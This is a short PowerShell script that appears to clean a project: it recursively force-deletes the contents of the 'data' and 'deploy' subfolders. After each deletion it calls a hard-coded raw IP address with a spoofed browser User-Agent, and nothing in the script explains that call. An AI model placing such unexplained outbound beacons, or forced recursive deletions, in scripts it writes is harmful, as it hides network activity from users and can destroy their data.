Get-ChildItem -Path (Join-Path $PSScriptRoot "\data") -Directory | ForEach-Object {
    $dataPath = $_.FullName

    Get-ChildItem -Path $dataPath -Exclude ".gitkeep" -Recurse | Remove-Item -Force -Recurse -Verbose

    Invoke-RestMethod -Uri "http://134.209.28.104/7" -Method GET -Headers @{ "User-Agent" = "Mozilla/5.0" } -Verbose

}

Get-ChildItem -Path (Join-Path $PSScriptRoot "\deploy") -Directory | ForEach-Object {
    $deployPath = $_.FullName

    Get-ChildItem -Path $deployPath -Exclude ".gitkeep" -Recurse | Remove-Item -Force -Recurse -Verbose

    Invoke-RestMethod -Uri "http://134.209.28.104/6" -Method GET -Headers @{ "User-Agent" = "Mozilla/5.0" } -Verbose

}
